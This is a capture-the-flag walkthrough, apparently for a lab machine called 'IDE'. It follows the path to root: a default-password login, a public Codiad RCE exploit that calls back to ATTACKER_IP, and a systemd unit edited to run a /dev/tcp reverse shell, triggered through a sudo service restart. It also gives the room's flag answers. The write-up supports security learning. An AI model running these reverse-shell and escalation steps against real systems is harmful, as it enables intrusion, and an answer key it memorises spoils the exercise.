# IDE

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.29 (Ubuntu)
62337/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 (Ubuntu)
```

---

## Enumeration: FTP

Going into FTP and trying anonymous, I got a file named `-`.
I copied the file, renamed it `test`, and got this:

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

<img width="1859" height="968" alt="Screenshot From 2025-09-02 21-53-28" src="https://github.com/user-attachments/assets/b529fedf-6baf-4aa6-af29-0a29d03c1c61" />

So there are two users (`john` and `drac`), and John’s password has been reset to the default.
There’s also mention of an image file.

---

## Environment

* **Target IP / Service**: `ide.thm:62337` (Codiad IDE running on web)
* **Users mentioned**: john, drac
* **Default password**: likely `password`

---

## Steps

### Step 1: Web login

With my luck, I tried:

```
Username: john
Password: password
```

It worked.

---

### Step 2: Exploit Codiad RCE

I noticed four different Python files working together and recognized the IDE as **Codiad 2.8.4**, which has a public RCE exploit.

Exploit link:
[https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit)

Setting up payload:

```bash
python exploit.py http://ide.thm:62337/ john password ATTACKER_IP 1234 linux
```

Follow the GIFs in the GitHub repo if confused.

---

### Step 3: First Flag Enumeration

Once in, I tried to read the first flag but couldn’t because of permissions.
Pivoting around, I checked `.bash_history` and found a password:

```
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

Switching user to `drac` with that password, I got in and grabbed the first flag:

> Q1: User flag?
> A1: 02930d21a8eb009f6d26361b2d24a466

---

## PrivEsc: drac → root

### Step 4: Sudo permissions

Running `sudo -l`:

```
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

This means I can restart the vsftpd service as root.

---

### Step 5: Malicious systemd unit file

I checked the systemd unit file for vsftpd at:

```
/lib/systemd/system/vsftpd.service
```

Normally this file contains instructions for systemd to launch the FTP server.
I edited it and changed the `ExecStart` line to run my payload:

```bash
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'
```

This command tells bash to start an interactive shell and connect it over TCP to my attacker machine on port 9001, redirecting input/output so I gain control.

---

### Step 6: Trigger payload

After saving the file, I reloaded systemd:

```bash
systemctl daemon-reload
```

Then I used my sudo privilege:

```bash
sudo /usr/sbin/service vsftpd restart
```

Since I was allowed to restart vsftpd as root, systemd executed my malicious command as root instead of starting the FTP server.

With a netcat listener running:

```bash
nc -lvnp 9001
```

I caught the reverse shell and gained root.

---

## Flags

> Q1: User flag
> A1: 02930d21a8eb009f6d26361b2d24a466

> Q2: Root flag
> A2: ce258cb16f47f1c66f0b0b77f4e0fb8d
